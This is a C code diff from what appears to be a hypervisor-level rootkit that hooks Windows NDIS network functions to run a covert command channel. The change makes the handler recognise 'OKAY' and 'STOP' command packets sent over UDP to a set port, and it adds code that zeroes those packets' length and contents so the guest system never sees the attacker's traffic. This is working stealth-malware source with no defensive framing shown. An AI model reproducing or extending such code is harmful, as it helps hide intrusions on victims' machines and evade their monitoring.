@@ -148,17 +148,17 @@ void check_router_arp(byte_t *pkt){
 }
 
 __attribute__((section(".vmm")))
-void check_if_attacker_msg(byte_t *pkt){
+BOOL check_if_attacker_msg(byte_t *pkt){
 
     ethernet_t *eth_hdr = pkt;
 
-    if (eth_hdr->type != FLIP_WORD(ETHERNET_TYPE_IP)) return;
+    if (eth_hdr->type != FLIP_WORD(ETHERNET_TYPE_IP)) return FALSE;
 
     ip_t *ip_hdr = eth_hdr->payload;
-    if (ip_hdr->protocol != IPV4_PROTOCOL_UDP) return;
+    if (ip_hdr->protocol != IPV4_PROTOCOL_UDP) return FALSE;
     
     udp_t *udp_hdr = ip_hdr->payload;
-    if (udp_hdr->destination != FLIP_WORD(SRC_PORT)) return;
+    if (udp_hdr->destination != FLIP_WORD(SRC_PORT)) return FALSE;
 
     byte_t *payload = udp_hdr->payload;
     if (memcmp(payload, "OKAY", 5)){
@@ -169,6 +169,7 @@ void check_if_attacker_msg(byte_t *pkt){
         
         // remove the receive hook
         // *(uint16_t*)guest_virtual_to_physical(shared_cores_data.ndis + NDIS_NdisMIndicateReceiveNetBufferLists_OFFSET) = PUSH_R12;
+        return TRUE;
     }
     else if (memcmp(payload, "STOP", 5)){
         
@@ -185,8 +186,10 @@ void check_if_attacker_msg(byte_t *pkt){
         shared_cores_data.send_requests = TRUE;
         hook_function(guest_virtual_to_physical(shared_cores_data.ndis + NDIS_ndisMSendNBLToMiniportInternal_OFFSET), &shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_x, shared_cores_data.memory_shadowing_pages.ndisMSendNBLToMiniportInternal_rw);
 
+        return TRUE;
     }
 
+    return FALSE;
 }
 
 __attribute__((section(".vmm"))) 
@@ -307,6 +310,10 @@ void handle_NdisMIndicateReceiveNetBufferLists_hook(vmexit_data_t *state){
     }
 
     else if (shared_cores_data.mac_ready){
-        check_if_attacker_msg(physical_pkt_addr);
+        if (check_if_attacker_msg(physical_pkt_addr) ) {
+            // attacker packet. has to be hidden.
+            *(uint32_t*)guest_virtual_to_physical(NET_BUFFER_DataLength(PNetBuffer)) = 0;
+            memset(physical_pkt_addr, 0, data_length);
+        }
     }
 }
